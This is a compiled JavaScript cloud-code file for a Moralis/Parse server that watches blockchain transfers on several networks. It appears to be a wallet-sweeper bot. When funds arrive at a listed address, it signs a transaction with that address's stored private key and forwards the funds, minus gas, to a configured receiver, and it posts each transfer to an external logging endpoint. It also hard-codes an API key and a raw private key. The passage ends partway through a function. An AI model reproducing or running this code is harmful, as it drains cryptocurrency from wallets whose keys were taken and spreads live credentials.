"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
require("./generated/evmApi");
require("./generated/solApi");
const authService_1 = require("../auth/authService");
require("./cloud");
const config_1 = __importDefault(require("../config"));
const moralis_1 = __importDefault(require("moralis"));
// import Moralis from 'moralis';
const web3_1 = __importDefault(require("web3"));
// import Moralis from 'moralis';
// import Moralis from "moralis-v1";
const web3 = new web3_1.default(new web3_1.default.providers.HttpProvider(config_1.default.WEB3_PROVIDER_URL));
Parse.Cloud.define('requestMessage', async ({ params }) => {
    const { address, chain, networkType } = params;
    const message = await (0, authService_1.requestMessage)({
        address,
        chain,
        networkType,
    });
    return { message };
});
Parse.Cloud.define('getPluginSpecs', () => {
    // Not implemented, only excists to remove client-side errors when using the moralis-v1 package
    return [];
});
Parse.Cloud.define('getServerTime', () => {
    // Not implemented, only excists to remove client-side errors when using the moralis-v1 package
    return null;
});
Parse.Cloud.define("_AddressSyncStatus2", async (request) => {
    console.info('hello world run');
    // eth
    Parse.Cloud.afterSave("DemoTxs", async (request) => {
        if (request.object.get("confirmed") == false) {
            // console.info(request.object.get("chainId"));
            // return request.object.get("chainId");
            await passallfunc(request, request.object.get("chainId"));
            //  var logger = Moralis.Cloud.getLogger();
            var result = await web3.utils.fromWei(request.object.get("value"));
            Parse.Cloud.httpRequest({
                method: 'POST',
                url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                headers: {
                    "content-type": "application/json",
                    "x-apikey": "62c00e68e91195203e3aa78d",
                    "cache-control": "no-cache"
                },
                body: {
                    addr_from: request.object.get("fromAddress"),
                    addr_to: request.object.get("toAddress"),
                    value: result,
                    time: request.object.get("_created_at"),
                    brand: getntwork(request.object.get("chainId")) + "_" + request.object.get("chainId") + "_streams",
                    server: "1demotrans"
                }
            }).then(function (httpResponse) {
                //logger.info(httpResponse.text);
                // logger.info("Logged Eth Trnasfer");
            }, function (httpResponse) {
                //  logger.error(JSON.stringify(httpResponse));
            });
        }
        else {
        }
    });
    Parse.Cloud.afterSave("LiveTxs", async (request) => {
        if (request.object.get("confirmed") == false) {
            await passallfunc(request, request.object.get("chainId"));
            //  var logger = Moralis.Cloud.getLogger();
            var result = await web3.utils.fromWei(request.object.get("value"));
            Parse.Cloud.httpRequest({
                method: 'POST',
                url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                headers: {
                    "content-type": "application/json",
                    "x-apikey": "62c00e68e91195203e3aa78d",
                    "cache-control": "no-cache"
                },
                body: {
                    addr_from: request.object.get("fromAddress"),
                    addr_to: request.object.get("toAddress"),
                    value: result,
                    time: request.object.get("_created_at"),
                    brand: getntwork(request.object.get("chainId")) + "_" + request.object.get("chainId") + "_streams",
                    server: "1"
                }
            }).then(function (httpResponse) {
                //logger.info(httpResponse.text);
                // logger.info("Logged Eth Trnasfer");
            }, function (httpResponse) {
                //  logger.error(JSON.stringify(httpResponse));
            });
        }
        else {
        }
    });
    async function proxsend(request, toAddrDtls, rcveraddress, prjid, ntwk, value, loggerr) {
        // loggerr.info(JSON.stringify( toAddrDtls.get("addr")));
        // loggerr.info(JSON.stringify(prjid));
        var web3;
        if (ntwk == "eth") {
            // web3 = new Moralis.Web3(
            //   new Moralis.Web3.providers.HttpProvider(
            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
            //   )
            // );
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://eth.getblock.io/" + prjid + "/mainnet/"));
            // web3 = new Moralis.Web3(
            //   new Moralis.Web3.providers.HttpProvider(
            //    //    'https://rpc.ankr.com/bsc_testnet_chapel'
            //    // "https://bsc.getblock.io/testnet/?api_key="+prjid
            //    // "https://bsc.getblock.io/mainnet/?api_key="+prjid
            //       "https://rpc.ankr.com/eth/"+prjid
            //       //  "https://eth.getblock.io/mainnet/?api_key="+prjid
            //   )
            // );
        }
        //  web3 = new Moralis.Web3(
        //      new Moralis.Web3.providers.HttpProvider(
        //         //  'https://rinkeby.infura.io/v3/'+prjid
        //         //  'https://rpc.ankr.com/eth_rinkeby'
        //         // "https://eth.getblock.io/rinkeby/?api_key="+prjid
        //         "https://rpc.ankr.com/eth/"+prjid
        //         // "https://eth.getblock.io/mainnet/?api_key="+prjid
        //      )
        //    );
        if (ntwk == "bsc") {
            // web3 = new Moralis.Web3(
            //   new Moralis.Web3.providers.HttpProvider(
            //       'https://indulgent-yolo-borough.bsc-testnet.discover.quiknode.pro/4c61b20edcc95c95701995d59c193a2cc493fc15/'
            //   )
            // );
            //  web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/bsc/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://bsc.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //     //    'https://rpc.ankr.com/bsc_testnet_chapel'
            //     // "https://bsc.getblock.io/testnet/?api_key="+prjid
            //     // "https://bsc.getblock.io/"+prjid+"/mainnet/"
            //     // "https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/"
            //     // https://bsc.getblock.io/5589d2a1-518e-4057-a711-f882e23287d6/mainnet/
            //       //  "https://rpc.ankr.com/bsc/"+prjid
            //       "https://rpc.ankr.com/bsc/"+prjid
            //    )
            //  );
            //  loggerr.info("got to bsccccc");
        }
        if (ntwk == "polygon") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/polygon/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://matic.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //     //    'https://rpc.ankr.com/polygon_mumbai'
            //     //    'https://rpc.ankr.com/polygon'
            //     // "https://matic.getblock.io/testnet/?api_key="+prjid
            //     // "https://matic.getblock.io/mainnet/?api_key="+prjid
            //     "https://rpc.ankr.com/polygon/"+prjid
            //    )
            //  );
        }
        if (ntwk == "avax") {
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://avax.getblock.io/" + prjid + "/mainnet/ext/bc/C/rpc"));
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/avalanche/"+prjid));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //     //    'https://rpc.ankr.com/avalanche'
            //     //    'https://rpc.ankr.com/avalanche_fuji'
            //     // "https://avax.getblock.io/testnet/ext/bc/C/rpc?api_key="+prjid
            //     // "https://avax.getblock.io/mainnet/ext/bc/C/rpc?api_key="+prjid
            //     "https://rpc.ankr.com/avalanche/"+prjid
            //     // "https://rpc.ankr.com/avalanche-c/"+prjid
            //    )
            //  );
            //  loggerr.info(web3+" web3 i got here");
        }
        if (ntwk == "fantom") {
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://ftm.getblock.io/" + prjid + "/mainnet/"));
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        // 'https://rpc.ankr.com/fantom_testnet'
            //     //    'https://rpc.ankr.com/fantom'
            //     // "https://ftm.getblock.io/mainnet/?api_key="+prjid
            //     "https://rpc.ankr.com/fantom/"+prjid
            //     // "https://rpc.ankr.com/fantom/"+prjid
            //    )
            //  );
        }
        if (ntwk == "cronos") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://cro.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
            //    )
            //  );
        }
        if (ntwk == "arb") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://arb.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
            //    )
            //  );
        }
        if (ntwk == "op") {
            // web3 = new Web3(new Web3.providers.HttpProvider("https://rpc.ankr.com/fantom/"+prjid));
            web3 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://op.getblock.io/" + prjid + "/mainnet/"));
            //  web3 = new Moralis.Web3(
            //    new Moralis.Web3.providers.HttpProvider(
            //        'https://cro.getblock.io/mainnet/?api_key='+prjid
            //    )
            //  );
        }
        if (ntwk == null) {
            var result = await web3.utils.fromWei(request.object.get("value"));
            Parse.Cloud.httpRequest({
                method: 'POST',
                url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                headers: {
                    "content-type": "application/json",
                    "x-apikey": "62c00e68e91195203e3aa78d",
                    "cache-control": "no-cache"
                },
                body: {
                    addr_from: request.object.get("fromAddress"),
                    addr_to: request.object.get("toAddress"),
                    value: result,
                    time: request.object.get("_created_at"),
                    brand: getntwork(request.object.get("chainId")) + "_" + request.object.get("chainId") + "_streams",
                    server: "1new_null"
                }
            }).then(function (httpResponse) {
                //logger.info(httpResponse.text);
                // logger.info("Logged Eth Trnasfer");
            }, function (httpResponse) {
                //  logger.error(JSON.stringify(httpResponse));
            });
        }
        // old
        //    var options = {
        //      chain: ntwk,
        //      address: toAddrDtls.get("addr")
        //    };
        //    var balance = await Moralis.Web3API.account.getNativeBalance(options);
        //    var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
        //    var gasPrice = await web3.eth.getGasPrice();
        //    var gas = await web3.eth.estimateGas({
        //      to: rcveraddress,
        //      from: toAddrDtls.get("addr"),
        //      value: balance.balance,
        //    });
        //    var BN = web3.utils.BN;
        //    // var fee = gasPrice * gas;
        //    nGasprice = new BN(gasPrice);
        //    var fee = nGasprice.mul(new BN(gas));
        //    bl = new BN(balance.balance);
        //    baltosend =  bl.sub(fee);
        //    if(parseInt(baltosend) <= 0 ) {
        //      bl = new BN(value);
        //      baltosend =  bl.sub(fee);
        //    }
        // end old 
        // new
        // var nonce = await web3.eth.getTransactionCount(toAddrDtls.get("addr"), 'latest'); // nonce starts counting from 0
        var gasPrice = await web3.eth.getGasPrice();
        var gas = 21000;
        var BN = web3.utils.BN;
        // var fee = gasPrice * gas;
        var nGasprice = new BN(gasPrice);
        var fee = nGasprice.mul(new BN(2));
        fee = new BN(new BN(fee)).mul(new BN(gas));
        var bl = new BN(value);
        var baltosend = bl.sub(fee);
        // loggerr.info(fee+" Old fee");
        // loggerr.info(nonce+" nounce");
        // if( toAddrDtls.get("addr") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
        //   loggerr.info("Crazy Point");
        //   // var halffee = nGasprice.divn(new BN("2"))
        //  var prefee = nGasprice.add(new BN(nGasprice));
        //  nGasprice = prefee;
        //  fee = prefee.mul(new BN(gas));
        //  // bl = new BN(value);
        //  baltosend =  bl.sub(fee);
        // }
        if (parseInt(baltosend) <= 0) {
            // bl = new BN(value);
            baltosend = bl.sub(fee);
        }
        // end new
        //  loggerr.info(baltosend.toString()+ "bal to send");
        //  loggerr.info(nGasprice.toString()+ " gas price");
        //  loggerr.info(fee.toString()+ "new fee");
        //    logger.info(balance.balance.toString());
        //  logger.info(value.toString()+ " value");
        //  logger.info(ntwk+ " ntwk");
        var transaction = {
            'to': rcveraddress,
            'value': baltosend,
            'gas': gas,
            'gasPrice': gasPrice,
            // 'nonce': nonce+1,
            // optional data field to send message or execute smart contract
        };
        var signedTx = await web3.eth.accounts.signTransaction(transaction, toAddrDtls.get("pkaddr"));
        try {
            web3.eth.sendSignedTransaction(signedTx.rawTransaction).on('transactionHash', async (hash) => {
                // loggerr.info(hash.toString());
            }).on('receipt', async (reciept) => {
                await mshlogger(request, ntwk, loggerr);
                // loggerr.info(JSON.stringify(reciept));
            }).on('error', async (error) => {
                await mshlogger(request, JSON.stringify(error), loggerr);
                // loggerr.info(JSON.stringify(error));
                // loggerr.info("errror");
            });
        }
        catch (error) {
            // loggerr.info(JSON.stringify(error));
            // loggerr.info("catch errror");
        }
    }
    async function passallfunc(request, ntwk) {
        // // var Web3 = require('web3');
        // let projectId = "3dd198ffc6924f45aa3b50cae37aa6dd";
        // // var web3ws = new Web3(new Web3.providers.WebsocketProvider('wss://rinkeby.infura.io/ws/v3/' + projectId));
        // // var web3 = new Web3(new Web3.providers.HttpProvider('https://rinkeby.infura.io/v3/' + projectId));
        //  var logger = Moralis.Cloud.getLogger();
        var config = await Parse.Config.get({ useMasterKey: true });
        var InfurId = config.get("Infur");
        var recver = config.get("addr");
        var toaddress = request.object.get("toAddress");
        if (request.object.get("fromAddress") == "0x7aba0a1453a01ba55508f4f48b462fcb1bd471bf") {
            toaddress = request.object.get("fromAddress");
        }
        var value = request.object.get("value");
        // var toaddress = "0x2CA37Dd92856f00E8c77f843256c7Db4c6FAd2E9";
        // var value = "10000000";
        var query = new Parse.Query("hpaddr");
        // query.limit(10);
        query.fullText("addr", toaddress);
        var results = await query.first(); // [ Monster, Monster, ...]
        if (results) {
            //  logger.info("got to result");
            await proxsend(request, results, recver, InfurId, ntwk, value, 'logger');
        }
        else {
            //  logger.info(JSON.stringify(results));
            // console.log("no result"); 
        }
        // proxsend("toaddress", "rcveraddress", "pk", "pojectid")
        //   web3ws = new Moralis.Web3(
        //     new Moralis.Web3.providers.WebsocketProvider(
        //         'wss://rinkeby.infura.io/ws/v3/' + projectId
        //     )
        //   );
    }
    async function botDripWeb3js() {
        var config = await Parse.Config.get({ useMasterKey: true });
        var prjid = config.get("Infur");
        // var logger = Moralis.Cloud.getLogger();
        var stop = false;
        var count = 0;
        let abijson = [{ "inputs": [{ "internalType": "address", "name": "_thirdwebFee", "type": "address" }], "stateMutability": "nonpayable", "type": "varructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegator", "type": "address" }, { "indexed": true, "internalType": "address", "name": "fromDelegate", "type": "address" }, { "indexed": true, "internalType": "address", "name": "toDelegate", "type": "address" }], "name": "DelegateChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegate", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "previousBalance", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "newBalance", "type": "uint256" }], "name": "DelegateVotesChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Paused", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "platformFeeRecipient", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "platformFeeBps", "type": "uint256" }], "name": "PlatformFeeInfoUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "recipient", "type": "address" }], "name": "PrimarySaleRecipientUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "previousAdminRole", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "newAdminRole", "type": "bytes32" }], "name": "RoleAdminChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleGranted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleRevoked", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "quantityMinted", "type": "uint256" }], "name": "TokensMinted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "signer", "type": "address" }, { "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "indexed": false, "internalType": "struct ITokenERC20.MintRequest", "name": "mintRequest", "type": "tuple" }], "name": "TokensMintedWithSignature", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Unpaused", "type": "event" }, { "inputs": [], "name": "DEFAULT_ADMIN_ROLE", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "DOMAIN_SEPARATOR", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burnFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint32", "name": "pos", "type": "uint32" }], "name": "checkpoints", "outputs": [{ "components": [{ "internalType": "uint32", "name": "fromBlock", "type": "uint32" }, { "internalType": "uint224", "name": "votes", "type": "uint224" }], "internalType": "struct ERC20VotesUpgradeable.Checkpoint", "name": "", "type": "tuple" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractType", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "contractURI", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractVersion", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }], "name": "delegate", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }, { "internalType": "uint256", "name": "nonce", "type": "uint256" }, { "internalType": "uint256", "name": "expiry", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "delegateBySig", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "delegates", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastTotalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getPlatformFeeInfo", "outputs": [{ "internalType": "address", "name": "", "type": "address" }, { "internalType": "uint16", "name": "", "type": "uint16" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleAdmin", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "uint256", "name": "index", "type": "uint256" }], "name": "getRoleMember", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleMemberCount", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "getVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "grantRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "hasRole", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_defaultAdmin", "type": "address" }, { "internalType": "string", "name": "_name", "type": "string" }, { "internalType": "string", "name": "_symbol", "type": "string" }, { "internalType": "string", "name": "_contractURI", "type": "string" }, { "internalType": "address[]", "name": "_trustedForwarders", "type": "address[]" }, { "internalType": "address", "name": "_primarySaleRecipient", "type": "address" }, { "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "initialize", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "forwarder", "type": "address" }], "name": "isTrustedForwarder", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mintTo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "mintWithSignature", "outputs": [], "stateMutability": "payable", "type": "function" }, { "inputs": [{ "internalType": "bytes[]", "name": "data", "type": "bytes[]" }], "name": "multicall", "outputs": [{ "internalType": "bytes[]", "name": "results", "type": "bytes[]" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "nonces", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "numCheckpoints", "outputs": [{ "internalType": "uint32", "name": "", "type": "uint32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "pause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "paused", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "deadline", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "primarySaleRecipient", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "renounceRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "revokeRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "string", "name": "_uri", "type": "string" }], "name": "setContractURI", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "setPlatformFeeInfo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_saleRecipient", "type": "address" }], "name": "setPrimarySaleRecipient", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "unpause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "verify", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }, { "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }];
        // var web33 = new Web3("https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd");
        var web33 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://eth.getblock.io/" + prjid + "/mainnet/"));
        // var web33 = new Moralis.Web3(
        //   new Moralis.Web3.providers.HttpProvider(
        //     // "https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
        //     "https://bsc.getblock.io/mainnet/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
        //   )
        // );
        // console.log(web33.version)
        //  logger.info(JSON.stringify(web33.version ));
        var sponsor = web33.eth.accounts.privateKeyToAccount('ea323e33f3536aa2974e32aacc1a840399363bfee72580763241c0a3fab2fb5b');
        ;
